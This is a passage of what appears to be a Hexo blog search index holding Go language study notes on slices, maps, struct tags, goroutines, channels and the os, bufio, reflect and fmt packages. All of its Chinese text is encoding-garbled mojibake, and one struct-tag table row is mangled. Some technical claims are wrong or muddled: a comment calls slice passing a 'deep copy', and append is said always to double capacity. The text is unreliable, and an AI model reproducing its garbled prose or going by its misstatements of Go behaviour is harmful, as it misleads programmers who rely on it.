<h3 id="2-åŠ¨æ€æ•°ç»„"><a href="#2-åŠ¨æ€æ•°ç»„" class="headerlink" title="2.åŠ¨æ€æ•°ç»„:"></a>2.åŠ¨æ€æ•°ç»„:</h3><h4 id="å£°æ˜æ–¹å¼-2"><a href="#å£°æ˜æ–¹å¼-2" class="headerlink" title="å£°æ˜æ–¹å¼:"></a>å£°æ˜æ–¹å¼:</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å£°æ˜ slice1 æ˜¯ä¸€ä¸ªåˆ‡ç‰‡ï¼Œå¹¶ä¸”åˆå§‹åŒ–ï¼Œé»˜è®¤å€¼æ˜¯ 1, 2, 3ã€‚é•¿åº¦ len æ˜¯ 3</span></span><br><span class="line">slice1 := []<span class="type">int</span>&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ slice1 æ˜¯ä¸€ä¸ªåˆ‡ç‰‡ï¼Œä½†æ˜¯å¹¶æ²¡æœ‰ç»™ slice åˆ†é…ç©ºé—´</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span></span><br><span class="line">slice1 = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)  <span class="comment">// å¼€è¾Ÿ 3 ä¸ªç©ºé—´ï¼Œé»˜è®¤å€¼æ˜¯ 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ slice1 æ˜¯ä¸€ä¸ªåˆ‡ç‰‡ï¼ŒåŒæ—¶ç»™ slice åˆ†é…ç©ºé—´ï¼Œ3 ä¸ªç©ºé—´ï¼Œåˆå§‹åŒ–å€¼æ˜¯ 0</span></span><br><span class="line"><span class="keyword">var</span> slice1 []<span class="type">int</span> = <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// å£°æ˜ slice1 æ˜¯ä¸€ä¸ªåˆ‡ç‰‡ï¼ŒåŒæ—¶ç»™ slice åˆ†é…ç©ºé—´ï¼Œ3 ä¸ªç©ºé—´ï¼Œåˆå§‹åŒ–å€¼æ˜¯ 0ï¼Œ</span></span><br><span class="line"><span class="comment">// é€šè¿‡ := æ¨å¯¼å‡º slice æ˜¯ä¸€ä¸ªåˆ‡ç‰‡</span></span><br><span class="line">slice1 := <span class="built_in">make</span>([]<span class="type">int</span>, <span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">pr</span><span class="params">(arr []<span class="type">int</span>)</span></span>&#123;</span><br><span class="line">    <span class="comment">//è¿™æ ·æ˜¯æ·±æ‹·è´ï¼Œä¼šå½±å“åŸå€¼ï¼Œä¼ é€’çš„æ˜¯æŒ‡é’ˆ</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="appendå¢åŠ "><a href="#appendå¢åŠ " class="headerlink" title="appendå¢åŠ :"></a>appendå¢åŠ :</h4><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">å½“åŠ¨æ€æ•°ç»„é€šè¿‡</span><br><span class="line">         --myA=<span class="built_in">append</span>(myA,<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line"> <span class="built_in">cap</span>:å®¹é‡ä¼šæ‰©å¤§ä¸¤å€</span><br><span class="line"> ä½†æ˜¯<span class="built_in">len</span>:åªä¼šå¢åŠ <span class="number">2</span></span><br></pre></td></tr></table></figure>

<h3 id="3-æˆªå–æ“ä½œ"><a href="#3-æˆªå–æ“ä½œ" class="headerlink" title="3.æˆªå–æ“ä½œ:"></a>3.æˆªå–æ“ä½œ:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">newSlice := oldSlice[start:end]</span><br><span class="line">            startï¼šèµ·å§‹ä¸‹æ ‡ï¼ˆåŒ…å«ï¼‰</span><br><span class="line">            endï¼šç»“æŸä¸‹æ ‡ï¼ˆä¸åŒ…å«ï¼‰</span><br><span class="line">            ç»“æœé•¿åº¦ï¼šend - start</span><br><span class="line">ä½†æ˜¯<span class="built_in">cap</span>ï¼šå®¹é‡å’ŒåŸåˆ‡ç‰‡ä¸€è‡´</span><br></pre></td></tr></table></figure>

<h2 id="10-map-é”®å€¼å¯¹ç±»ä¼¼å­—å…¸"><a href="#10-map-é”®å€¼å¯¹ç±»ä¼¼å­—å…¸" class="headerlink" title="10.map(é”®å€¼å¯¹ç±»ä¼¼å­—å…¸):"></a>10.map(é”®å€¼å¯¹ç±»ä¼¼å­—å…¸):</h2><h3 id="1-å£°æ˜æ–¹å¼"><a href="#1-å£°æ˜æ–¹å¼" class="headerlink" title="1.å£°æ˜æ–¹å¼:"></a>1.å£°æ˜æ–¹å¼:</h3><table>
<thead>
<tr>
<th>å£°æ˜æ–¹å¼</th>
<th>ç¤ºä¾‹ä»£ç </th>
<th>æ˜¯å¦éœ€è¦ <code>make</code></th>
<th>æ˜¯å¦æ”¯æŒç«‹å³èµ‹å€¼</th>
<th>å¸¸ç”¨åœºæ™¯</th>
</tr>
</thead>
<tbody><tr>
<td><code>var + make</code></td>
<td><code>var m map[string]string&lt;br&gt;m = make(map[string]string)&lt;br&gt;m[&quot;key&quot;] = &quot;value&quot;</code></td>
<td>âœ… æ˜¯</td>
<td>âŒ å¦</td>
<td>å…¨å±€å˜é‡ï¼Œéœ€å»¶ååˆå§‹åŒ–</td>
</tr>
<tr>
<td><code>:= + make</code></td>
<td><code>m := make(map[int]string)&lt;br&gt;m[1] = &quot;value&quot;</code></td>
<td>âœ… æ˜¯</td>
<td>âŒ å¦</td>
<td>å±€éƒ¨å˜é‡ï¼Œç®€æ´åˆå§‹åŒ–</td>
</tr>
<tr>
<td>å­—é¢é‡åˆå§‹åŒ–</td>
<td><code>m := map[string]string&#123;&lt;br&gt;  &quot;k1&quot;: &quot;v1&quot;,&lt;br&gt;  &quot;k2&quot;: &quot;v2&quot;,&lt;br&gt;&#125;</code></td>
<td>âŒ å¦</td>
<td>âœ… æ˜¯</td>
<td>å·²çŸ¥æ•°æ®æ—¶å¿«é€Ÿåˆå§‹åŒ–</td>
</tr>
</tbody></table>
<h2 id="11-é¢å‘å¯¹è±¡"><a href="#11-é¢å‘å¯¹è±¡" class="headerlink" title="11.é¢å‘å¯¹è±¡"></a>11.é¢å‘å¯¹è±¡</h2><p>Go è¯­è¨€ä¸æ˜¯å…¸å‹çš„é¢å‘å¯¹è±¡è¯­è¨€ï¼Œä½†å®ƒé€šè¿‡ <strong>ç»“æ„ä½“ + æ¥å£</strong> å®ç°äº†å°è£…ã€ç»§æ‰¿å’Œå¤šæ€çš„èƒ½åŠ›ã€‚</p>
<table>
<thead>
<tr>
<th>ç‰¹æ€§</th>
<th>Goå®ç°æ–¹å¼</th>
<th>ç¤ºä¾‹</th>
<th>ç‰¹ç‚¹</th>
</tr>
</thead>
<tbody><tr>
<td>å°è£…</td>
<td>å­—æ®µ&#x2F;æ–¹æ³•é¦–å­—æ¯å¤§å†™è¡¨ç¤º<strong>å…¬å¼€</strong>ï¼Œå°å†™è¡¨ç¤º<strong>ç§æœ‰</strong></td>
<td><code>Name string</code> vs <code>name string</code></td>
<td>è®¿é—®æ§åˆ¶åŸºäºå¤§å°å†™</td>
</tr>
<tr>
<td>ç»§æ‰¿</td>
<td><strong>é€šè¿‡ç»„åˆï¼ˆEmbeddingï¼‰ç»“æ„ä½“</strong>å®ç°â€œç»§æ‰¿â€</td>
<td><code>type Student struct &#123; Human &#125;</code></td>
<td>æ²¡æœ‰ <code>extends</code>ï¼Œä½†æœ‰å­—æ®µ&#x2F;æ–¹æ³•æå‡</td>
</tr>
<tr>
<td>å¤šæ€</td>
<td><strong>é€šè¿‡æ¥å£ interface</strong> å®ç°</td>
<td><code>type Speaker interface &#123; Speak() &#125;</code></td>
<td>æ¥å£éšå¼å®ç°ï¼Œæ— éœ€å…³é”®å­—</td>
</tr>
</tbody></table>
<h2 id="12-ç»“æ„ä½“æ ‡ç­¾"><a href="#12-ç»“æ„ä½“æ ‡ç­¾" class="headerlink" title="12.ç»“æ„ä½“æ ‡ç­¾:"></a>12.ç»“æ„ä½“æ ‡ç­¾:</h2><p>åœ¨ Go è¯­è¨€ä¸­ï¼Œ<strong>ç»“æ„ä½“æ ‡ç­¾ï¼ˆTagï¼‰</strong> æ˜¯ç»™ç»“æ„ä½“å­—æ®µæ·»åŠ é¢å¤–å…ƒä¿¡æ¯çš„ä¸€ç§æ–¹å¼ï¼Œæœ€å¸¸è§çš„åº”ç”¨åœºæ™¯æ˜¯ç”¨äº <strong>JSON ç¼–è§£ç ã€æ•°æ®åº“ORMæ˜ å°„ã€éªŒè¯å™¨ç­‰</strong>ã€‚</p>
<table>
<thead>
<tr>
<th>é¡¹ç›®</th>
<th>ç¤ºä¾‹</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>è¯­æ³•æ ¼å¼</td>
<td><code>å­—æ®µå ç±»å‹ </code>æ ‡ç­¾å:â€å€¼â€<code> </code></td>
<td>æ ‡ç­¾å¿…é¡»ç”¨åå¼•å· <code> </code> <code> </code> &#96;</td>
</tr>
<tr>
<td>JSON æ ‡ç­¾</td>
<td><code>json:&quot;name&quot;</code></td>
<td>ç”¨äºæ§åˆ¶å­—æ®µåºåˆ—åŒ–æ—¶çš„åç§°</td>
</tr>
<tr>
<td>å¤šæ ‡ç­¾</td>
<td><code>json:&quot;name&quot; db:&quot;user_name&quot;</code></td>
<td>å¤šä¸ªæ ‡ç­¾ä¸­é—´ç”¨ç©ºæ ¼åˆ†éš”</td>
</tr>
<tr>
<td>å¿½ç•¥å­—æ®µ</td>
<td><code>json:&quot;-&quot;</code></td>
<td>è¢« <code>-</code> å¿½ç•¥ï¼Œä¸å‚ä¸åºåˆ—åŒ–</td>
</tr>
<tr>
<td>ç»“æ„ä½“å­—æ®µé¦–å­—æ¯å¿…é¡»å¤§å†™</td>
<td><code>Name string</code></td>
<td>å°å†™å­—æ®µæ— æ³•å¯¼å‡ºï¼Œæ ‡ç­¾ä¹Ÿæ— æ•ˆ</td>
</tr>
</tbody></table>
<h3 id="æ ‡ç­¾çš„ç”¨é€”"><a href="#æ ‡ç­¾çš„ç”¨é€”" class="headerlink" title="æ ‡ç­¾çš„ç”¨é€”"></a>æ ‡ç­¾çš„ç”¨é€”</h3><table>
<thead>
<tr>
<th>ç”¨é€”</th>
<th>æ ‡ç­¾ç¤ºä¾‹</th>
<th>ç¬¬ä¸‰æ–¹åº“</th>
</tr>
</thead>
<tbody><tr>
<td>JSON</td>
<td><code>json:&quot;name&quot;</code></td>
<td><code>encoding/json</code></td>
</tr>
<tr>
<td>æ•°æ®åº“ORM</td>
<td><code>gorm:&quot;column:user_name&quot;</code></td>
<td><code>gorm</code></td>
</tr>
<tr>
<td>è¡¨å•éªŒè¯</td>
<td><code>validate:&quot;required&quot;</code></td>
<td><code>go-playground/validator</code></td>
</tr>
<tr>
<td>é…ç½®è§£æ</td>
<td><code>yaml:&quot;port&quot;</code></td>
<td><code>gopkg.in/yaml.v2</code></td>
</tr>
<tr>
<td>ç»“æ„ä½“æ¯”è¾ƒ</td>
<td><code>cmp:&quot;ignore&quot;</code></td>
<td><code>github.com/google/go-cmp</code></td>
</tr>
</tbody></table>
<h2 id="13-goåç¨‹-goroutine"><a href="#13-goåç¨‹-goroutine" class="headerlink" title="13.goåç¨‹(goroutine):"></a>13.goåç¨‹(goroutine):</h2><h3 id="1-åŸºç¡€ç”¨æ³•"><a href="#1-åŸºç¡€ç”¨æ³•" class="headerlink" title="1.åŸºç¡€ç”¨æ³•:"></a>1.åŸºç¡€ç”¨æ³•:</h3><table>
<thead>
<tr>
<th>ç”¨æ³•åœºæ™¯</th>
<th>è¯­æ³•</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>å¯åŠ¨åç¨‹</td>
<td><code>go å‡½æ•°å()</code></td>
<td><code>go doWork()</code></td>
</tr>
<tr>
<td>åŒ¿åå‡½æ•°åç¨‹</td>
<td><code>go func()&#123;...&#125;()</code></td>
<td><code>go func()&#123; fmt.Println(&quot;Hi&quot;) &#125;()</code></td>
</tr>
<tr>
<td>åç¨‹åŒæ­¥</td>
<td><code>sync.WaitGroup</code></td>
<td>ç”¨äºç­‰å¾…æ‰€æœ‰åç¨‹å®Œæˆ</td>
</tr>
<tr>
<td>åç¨‹é€šä¿¡</td>
<td><code>chan</code> é€šé“</td>
<td><code>ch := make(chan int)</code>ï¼Œç”¨äºå‘é€&#x2F;æ¥æ”¶æ•°æ®</td>
</tr>
<tr>
<td>åç¨‹è¶…æ—¶</td>
<td><code>select + time.After</code></td>
<td>å¤„ç†é˜»å¡æ“ä½œçš„è¶…æ—¶æ§åˆ¶</td>
</tr>
</tbody></table>
<h3 id="2-æ³¨æ„äº‹é¡¹"><a href="#2-æ³¨æ„äº‹é¡¹" class="headerlink" title="2.æ³¨æ„äº‹é¡¹:"></a>2.æ³¨æ„äº‹é¡¹:</h3><table>
<thead>
<tr>
<th>æ³¨æ„ç‚¹</th>
<th>åŸå› </th>
</tr>
</thead>
<tbody><tr>
<td>ä¸è¦åœ¨ goroutine ä¸­è®¿é—®å…±äº«å˜é‡ï¼ˆéœ€åŠ é”æˆ–ä½¿ç”¨ channelï¼‰</td>
<td>é¿å…æ•°æ®ç«äº‰ï¼ˆdata raceï¼‰</td>
</tr>
<tr>
<td>ä¸»ç¨‹åºè¦ç­‰å¾…åç¨‹å®Œæˆï¼Œå¦åˆ™ç¨‹åºä¼šæå‰é€€å‡º</td>
<td>ä½¿ç”¨ <code>sync.WaitGroup</code></td>
</tr>
<tr>
<td>ä¸è¦å¿˜è®° <code>wg.Done()</code>ï¼Œå¦åˆ™ä¼šæ­»é”</td>
<td><code>wg.Wait()</code> æ°¸è¿œä¸ä¼šç»“æŸ</td>
</tr>
<tr>
<td>å¤§é‡åç¨‹å¯ç”¨ <code>GOMAXPROCS</code> æ§åˆ¶æ ¸å¿ƒæ•°</td>
<td><code>runtime.GOMAXPROCS(n)</code></td>
</tr>
</tbody></table>
<h2 id="14ç®¡é“-channel"><a href="#14ç®¡é“-channel" class="headerlink" title="14ç®¡é“(channel):"></a>14ç®¡é“(channel):</h2><h3 id="1-åŸºæœ¬ä½¿ç”¨"><a href="#1-åŸºæœ¬ä½¿ç”¨" class="headerlink" title="1.åŸºæœ¬ä½¿ç”¨:"></a>1.åŸºæœ¬ä½¿ç”¨:</h3><table>
<thead>
<tr>
<th>æ¦‚å¿µ</th>
<th>è¯´æ˜</th>
<th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody><tr>
<td>åˆ›å»ºé€šé“</td>
<td>ç”¨ <code>make(chan ç±»å‹)</code> åˆ›å»º</td>
<td><code>ch := make(chan int)</code></td>
</tr>
<tr>
<td>å‘é€æ•°æ®</td>
<td>ä½¿ç”¨ <code>&lt;-</code> å‘é€šé“å‘é€å€¼</td>
<td><code>ch &lt;- 10</code></td>
</tr>
<tr>
<td>æ¥æ”¶æ•°æ®</td>
<td>ä»é€šé“ä¸­è¯»å–å€¼</td>
<td><code>val := &lt;-ch</code></td>
</tr>
<tr>
<td>æ— ç¼“å†²é€šé“</td>
<td>å‘é€æ—¶å¿…é¡»ç­‰å¾…æ¥æ”¶æ–¹</td>
<td><code>ch := make(chan int)</code></td>
</tr>
<tr>
<td>æœ‰ç¼“å†²é€šé“</td>
<td>å¯å­˜å‚¨ä¸€å®šæ•°é‡æ•°æ®</td>
<td><code>ch := make(chan int, 3)</code></td>
</tr>
<tr>
<td>å…³é—­é€šé“</td>
<td>è¡¨ç¤ºä¸ä¼šå†å‘é€æ•°æ®</td>
<td><code>close(ch)</code></td>
</tr>
<tr>
<td><code>for range</code> è¯»å–</td>
<td>è¯»å–æ‰€æœ‰é€šé“æ•°æ®ç›´åˆ°å…³é—­</td>
<td><code>for v := range ch &#123;...&#125;</code></td>
</tr>
</tbody></table>
<h3 id="2-ä¸selectä½¿ç”¨"><a href="#2-ä¸selectä½¿ç”¨" class="headerlink" title="2.ä¸selectä½¿ç”¨:"></a>2.ä¸selectä½¿ç”¨:</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">doneé€šé“å¯ä»¥çœ‹ä½œä¸€ä¸ªç©ºç»“æ„ä½“ï¼Œä¸å ç”¨å†…å­˜<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>ä½¿ç”¨æ¨¡å¼</th>
<th>ç¤ºä¾‹ä»£ç ç‰‡æ®µ</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>æ¥æ”¶å¤šä¸ªé€šé“æ•°æ®</td>
<td><code>select &#123; case v := &lt;-ch1: ... case v := &lt;-ch2: ... &#125;</code></td>
<td>ç­‰å¾…å¤šä¸ªè¾“å…¥ï¼Œå“ªä¸ªå…ˆæ¥å°±å¤„ç†å“ªä¸ª</td>
</tr>
<tr>
<td>è¶…æ—¶æ§åˆ¶</td>
<td><code>select &#123; case &lt;-ch: ... case &lt;-time.After(t): ... &#125;</code></td>
<td>é¿å… goroutine æ°¸è¿œé˜»å¡</td>
</tr>
<tr>
<td>é€€å‡ºä¿¡å·ç›‘å¬</td>
<td><code>select &#123; case &lt;-data: ... case &lt;-done: return &#125;</code></td>
<td>é€šè¿‡ <code>done</code> é€šé“ä¼˜é›…é€€å‡º</td>
</tr>
<tr>
<td>éé˜»å¡ send&#x2F;recv</td>
<td><code>select &#123; case ch &lt;- val: ... default: ... &#125;</code></td>
<td>å¦‚æœé€šé“é˜»å¡å°±æ‰§è¡Œ default</td>
</tr>
</tbody></table>
]]></content>
      <categories>
        <category>golang</category>
      </categories>
      <tags>
        <tag>è¯­è¨€å­¦ä¹ </tag>
        <tag>golang</tag>
      </tags>
  </entry>
  <entry>
    <title>å„ç§æ¨¡å—</title>
    <url>/2025/06/02/%E5%9F%BA%E7%A1%80%E8%AF%AD%E8%A8%80/golang/%E5%90%84%E7%A7%8D%E5%8C%85/</url>
    <content><![CDATA[<h2 id="1-osåŒ…"><a href="#1-osåŒ…" class="headerlink" title="1.osåŒ…:"></a>1.osåŒ…:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th><strong>åŠŸèƒ½</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>os.Create(name string)</code></td>
<td>åˆ›å»ºä¸€ä¸ªæ–°æ–‡ä»¶ï¼Œå¦‚æœæ–‡ä»¶å·²å­˜åœ¨åˆ™è¦†ç›–ã€‚</td>
</tr>
<tr>
<td><code>os.Open(name string)</code></td>
<td>æ‰“å¼€æŒ‡å®šçš„æ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><code>os.Remove(name string)</code></td>
<td>åˆ é™¤æŒ‡å®šæ–‡ä»¶ã€‚</td>
</tr>
<tr>
<td><code>os.Rename(oldpath, newpath string)</code></td>
<td>é‡å‘½åæ–‡ä»¶æˆ–ç›®å½•ã€‚</td>
</tr>
<tr>
<td><code>os.Mkdir(name string, perm os.FileMode)</code></td>
<td>åˆ›å»ºä¸€ä¸ªç›®å½•ã€‚</td>
</tr>
<tr>
<td><code>os.MkdirAll(path string, perm os.FileMode)</code></td>
<td>é€’å½’åˆ›å»ºç›®å½•ã€‚</td>
</tr>
<tr>
<td><code>os.Getenv(key string)</code></td>
<td>è·å–ç¯å¢ƒå˜é‡çš„å€¼ã€‚</td>
</tr>
<tr>
<td><code>os.Setenv(key, value string)</code></td>
<td>è®¾ç½®ç¯å¢ƒå˜é‡çš„å€¼ã€‚</td>
</tr>
<tr>
<td><code>os.Unsetenv(key string)</code></td>
<td>åˆ é™¤ç¯å¢ƒå˜é‡ã€‚</td>
</tr>
<tr>
<td><code>os.Exit(code int)</code></td>
<td>é€€å‡ºå½“å‰ç¨‹åºï¼Œè¿”å›æŒ‡å®šçš„é€€å‡ºç ã€‚</td>
</tr>
<tr>
<td><code>os.Getpid()</code></td>
<td>è·å–å½“å‰è¿›ç¨‹çš„PIDã€‚</td>
</tr>
<tr>
<td><code>os.Getppid()</code></td>
<td>è·å–å½“å‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹PIDã€‚</td>
</tr>
<tr>
<td><code>os.Stat(name string)</code></td>
<td>è·å–æ–‡ä»¶çš„åŸºæœ¬ä¿¡æ¯ï¼ˆå¦‚å¤§å°ã€æƒé™ã€ä¿®æ”¹æ—¶é—´ç­‰ï¼‰ã€‚</td>
</tr>
<tr>
<td><code>os.Lstat(name string)</code></td>
<td>è·å–æ–‡ä»¶çš„çŠ¶æ€ä¿¡æ¯ï¼Œä¸ä¼šè¿½è¸ªç¬¦å·é“¾æ¥ã€‚</td>
</tr>
<tr>
<td><code>os.Getwd()</code></td>
<td>è·å–å½“å‰å·¥ä½œç›®å½•ã€‚</td>
</tr>
<tr>
<td><code>os.Chdir(dir string)</code></td>
<td>æ”¹å˜å½“å‰å·¥ä½œç›®å½•ã€‚</td>
</tr>
<tr>
<td><code>os.Args</code></td>
<td>åŒ…å«å‘½ä»¤è¡Œå‚æ•°çš„åˆ‡ç‰‡ã€‚</td>
</tr>
<tr>
<td><code>os.TempDir()</code></td>
<td>è¿”å›ç³»ç»Ÿé»˜è®¤çš„ä¸´æ—¶æ–‡ä»¶ç›®å½•ã€‚</td>
</tr>
</tbody></table>
<h3 id="1-os-Args"><a href="#1-os-Args" class="headerlink" title="1.os.Args:"></a>1.os.Args:</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">os.Args[<span class="number">0</span>] æ˜¯ç¨‹åºè·¯å¾„   --ä¼šè¾“å‡ºç±»ä¼¼/tmp/go-build2554150706/b001/exe/mainçš„ä¸œè¥¿</span><br><span class="line">         ---è¦å¾—åˆ°å‘½ä»¤è¡Œå‚æ•°å¿…é¡»ä»[<span class="number">1</span>]å¼€å§‹</span><br><span class="line">   </span><br></pre></td></tr></table></figure>

<h2 id="2-bufioåŒ…"><a href="#2-bufioåŒ…" class="headerlink" title="2.bufioåŒ…:"></a>2.bufioåŒ…:</h2><table>
<thead>
<tr>
<th><strong>åŠŸèƒ½</strong></th>
<th><strong>æè¿°</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>bufio.NewReader(r io.Reader)</code></td>
<td>åˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²è¯»å–å™¨ï¼Œå¯ä»¥æé«˜è¯»å–æ•ˆç‡ã€‚</td>
</tr>
<tr>
<td><code>bufio.NewWriter(w io.Writer)</code></td>
<td>åˆ›å»ºä¸€ä¸ªæ–°çš„ç¼“å†²å†™å…¥å™¨ï¼Œå¯ä»¥æé«˜å†™å…¥æ•ˆç‡ã€‚</td>
</tr>
<tr>
<td><code>bufio.NewScanner(r io.Reader)</code></td>
<td>åˆ›å»ºä¸€ä¸ªæ–°çš„æ‰«æå™¨ï¼Œå¯ä»¥æŒ‰è¡Œè¯»å–è¾“å…¥å¹¶å¤„ç†æ•°æ®ã€‚</td>
</tr>
<tr>
<td><code>bufio.Reader.ReadLine()</code></td>
<td>ä»ç¼“å†²åŒºè¯»å–ä¸€è¡Œæ•°æ®ï¼ˆè¿”å›ä¸€è¡Œå­—ç¬¦å’Œå¸ƒå°”å€¼ï¼ŒæŒ‡ç¤ºæ˜¯å¦ç»“æŸï¼‰ã€‚</td>
</tr>
<tr>
<td><code>bufio.Writer.Write(p []byte)</code></td>
<td>å‘ç¼“å†²åŒºå†™å…¥æ•°æ®ï¼Œç›´åˆ°ç¼“å†²åŒºæ»¡æˆ–è°ƒç”¨ <code>Flush()</code>ã€‚</td>
</tr>
<tr>
<td><code>bufio.Reader.ReadString(delim byte)</code></td>
<td>ä»ç¼“å†²åŒºè¯»å–ç›´åˆ°æŒ‡å®šåˆ†éš”ç¬¦çš„å†…å®¹ã€‚</td>
</tr>
<tr>
<td><code>bufio.Writer.Flush()</code></td>
<td>å°†ç¼“å†²åŒºä¸­çš„æ•°æ®åˆ·æ–°åˆ°åº•å±‚ Writer ä¸­ã€‚</td>
</tr>
</tbody></table>
<h2 id="3-reflectåŒ…"><a href="#3-reflectåŒ…" class="headerlink" title="3.reflectåŒ…:"></a>3.reflectåŒ…:</h2><figure class="highlight go"><table><tr><td class="code"><pre><span class="line">Go çš„ reflect åŒ…æ˜¯ Go è¯­è¨€ä¸­çš„åå°„æœºåˆ¶å®ç°ï¼Œä¸»è¦ç”¨äºåœ¨è¿è¡Œæ—¶æ£€æŸ¥ç±»å‹ï¼ˆ<span class="keyword">type</span>ï¼‰å’Œå˜é‡çš„å€¼ï¼ˆvalueï¼‰ã€‚ä½¿ç”¨ reflectï¼Œä½ å¯ä»¥åŠ¨æ€åœ°è·å–å˜é‡çš„ç±»å‹ã€å€¼ï¼Œä¹Ÿå¯ä»¥åŠ¨æ€è®¾ç½®å®ƒçš„å€¼ã€‚</span><br></pre></td></tr></table></figure>



<table>
<thead>
<tr>
<th>é¡¹ç›®</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td>åŒ…å¯¼å…¥</td>
<td><code>import &quot;reflect&quot;</code></td>
</tr>
<tr>
<td>è·å–ç±»å‹ä¿¡æ¯</td>
<td><code>reflect.TypeOf(x)</code> è¿”å› <code>reflect.Type</code> å¯¹è±¡</td>
</tr>
<tr>
<td>è·å–å€¼ä¿¡æ¯</td>
<td><code>reflect.ValueOf(x)</code> è¿”å› <code>reflect.Value</code> å¯¹è±¡</td>
</tr>
<tr>
<td>è·å–&#x2F;è°ƒç”¨æ–¹æ³•å</td>
<td><code>reflect.TypeOf(x).Method(i)</code> é€ä¸ªè·å–ç±»å‹æ–¹æ³•</td>
</tr>
<tr>
<td>ä¿®æ”¹å˜é‡å€¼</td>
<td><code>reflect.ValueOf(x).Elem().Set()</code> å¿…é¡»ä¼ å…¥å¯å¯»å€çš„æŒ‡é’ˆ</td>
</tr>
<tr>
<td>åˆ¤æ–­ç±»å‹æˆ–ç§ç±»</td>
<td><code>t.Kind()</code> è·å–å…·ä½“ç±»å‹ç§ç±»ï¼ˆå¦‚ Structã€Ptrã€Slice ç­‰ï¼‰</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>åŠŸèƒ½</th>
<th>è¯´æ˜</th>
</tr>
</thead>
<tbody><tr>
<td><code>reflect.TypeOf()</code></td>
<td>è·å–å˜é‡çš„ç±»å‹ä¿¡æ¯</td>
</tr>
<tr>
<td><code>reflect.ValueOf()</code></td>
<td>è·å–å˜é‡çš„å€¼ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡ <code>.Interface()</code> è½¬æˆåŸå§‹ç±»å‹</td>
</tr>
<tr>
<td>ä¿®æ”¹ç»“æ„ä½“å­—æ®µ</td>
<td>å¿…é¡»ä½¿ç”¨æŒ‡é’ˆï¼Œå¹¶é€šè¿‡ <code>Elem()</code> è·å–å¯è®¾ç½®å€¼</td>
</tr>
<tr>
<td>åˆ¤æ–­ç±»å‹</td>
<td>ç”¨ <code>Kind()</code> åˆ¤æ–­æ˜¯å¦æ˜¯ structã€intã€slice ç­‰åŸºç¡€ç§ç±»</td>
</tr>
</tbody></table>
<h2 id="4-fmtåº“"><a href="#4-fmtåº“" class="headerlink" title="4.fmtåº“:"></a>4.fmtåº“:</h2><table>
<thead>
<tr>
<th>åˆ†ç±»</th>
<th>å‡½æ•°&#x2F;æ–¹æ³•</th>
<th>ç”¨é€”æè¿°</th>
</tr>
</thead>
<tbody><tr>
<td>æ ‡å‡†è¾“å‡º</td>
<td><code>Print</code></td>
<td>æ‰“å°è¾“å‡ºï¼Œä¸å¸¦æ¢è¡Œ</td>
</tr>
<tr>
<td></td>
<td><code>Println</code></td>
<td>æ‰“å°è¾“å‡ºï¼Œè‡ªåŠ¨æ¢è¡Œ</td>
</tr>
<tr>
<td></td>
<td><code>Printf</code></td>
<td>æŒ‰æ ¼å¼è¾“å‡ºï¼ˆæ ¼å¼åŒ–å­—ç¬¦ä¸²ï¼‰</td>
</tr>
<tr>
<td>å­—ç¬¦ä¸²è¾“å‡º</td>
<td><code>Sprintf</code></td>
<td>å°†æ ¼å¼åŒ–å†…å®¹è¿”å›ä¸ºå­—ç¬¦ä¸²</td>
</tr>
<tr>
<td></td>
<td><code>Sprint</code></td>
<td>ç±»ä¼¼ <code>Print</code>ï¼Œä½†è¿”å›å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td></td>
<td><code>Sprintln</code></td>
<td>ç±»ä¼¼ <code>Println</code>ï¼Œä½†è¿”å›å­—ç¬¦ä¸²</td>
</tr>
<tr>
<td>é”™è¯¯è¾“å‡º</td>
<td><code>Fprint</code></td>
<td>å°†å†…å®¹å†™å…¥ <code>io.Writer</code>ï¼ˆå¦‚ <code>os.Stderr</code>ï¼‰</td>
</tr>
<tr>
<td></td>
<td><code>Fprintf</code></td>
<td>åŒä¸Šï¼Œæ ¼å¼åŒ–è¾“å‡º</td>
</tr>
<tr>
<td></td>
<td><code>Fprintln</code></td>
<td>åŒä¸Šï¼Œè‡ªåŠ¨æ¢è¡Œ</td>
</tr>
<tr>
<td>æ ¼å¼è¾“å…¥</td>
<td><code>Scan</code></td>
<td>ä»æ ‡å‡†è¾“å…¥è¯»å–</td>
</tr>
<tr>
<td></td>
<td><code>Scanf</code></td>
<td>ä»æ ‡å‡†è¾“å…¥æŒ‰æ ¼å¼è¯»å–</td>
</tr>
<tr>
<td></td>
<td><code>Scanln</code></td>
<td>ä»æ ‡å‡†è¾“å…¥è¯»å–ä¸€è¡Œ</td>
</tr>
<tr>
<td></td>
<td><code>Sscan</code></td>
